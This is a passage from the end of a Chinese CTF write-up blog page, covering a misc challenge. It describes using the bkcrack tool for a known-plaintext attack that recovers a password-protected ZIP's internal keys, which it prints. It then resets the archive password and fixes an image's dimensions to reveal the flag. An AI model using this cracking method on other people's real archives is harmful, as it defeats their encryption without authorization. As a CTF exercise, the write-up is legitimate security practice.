+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">能得到后半部分flag</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6o6ubzMV4ShGJN2Q.png!thumbnail)</span><br><span class="line"></span><br><span class="line">之后把图片文件头16进制放到a.txt,里面用bkcrack工具来进行明文爆破得到</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>f45dd89f e3e929fb 3202ba17</p>
+<pre><code>
+再利用该工具修改压缩包的密码为123456
+
+![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/pgTaL7zQNqp89zu7.png!thumbnail)
+
+解压即可得到flag.png,之后更改一下图片的宽高即可得到前半段flag
+
+![img](https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/kEFaQYqpZJzKTp4n.png!thumbnail)
+
+两段flag一拼即可
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</code></pre>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1731244330962"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8F%A3%E7%AE%97"><span class="toc-number">1.1.</span> <span class="toc-text">python口算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezlaravel"><span class="toc-number">1.2.</span> <span class="toc-text">ezlaravel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">1.3.</span> <span class="toc-text">ez_python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fileread"><span class="toc-number">1.4.</span> <span class="toc-text">fileread</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E5%AE%9E%E9%99%85%E8%AF%B7%E6%B1%82%E7%9A%84-UR"><span class="toc-number">2.</span> <span class="toc-text">打印实际请求的 UR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E5%AE%9E%E9%99%85%E8%AF%B7%E6%B1%82%E7%9A%84-UR-1"><span class="toc-number">3.</span> <span class="toc-text">打印实际请求的 UR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%86%E8%A7%A3%E7%A0%81%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">将解码后的数据写入到一个文本文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8-l-S-%EF%BC%88%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%97%B6%E7%9A%84%E7%9B%B8%E5%90%8C%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">生成器 l(S)（与加密时的相同）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RC4-%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0-N"><span class="toc-number">6.</span> <span class="toc-text">RC4 解密函数 N</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#146436625375651639081292195233290471195543268962429"><span class="toc-number">7.</span> <span class="toc-text">[146436625375651639081292195233290471195543268962429]</span></a></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":350,"height":350},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
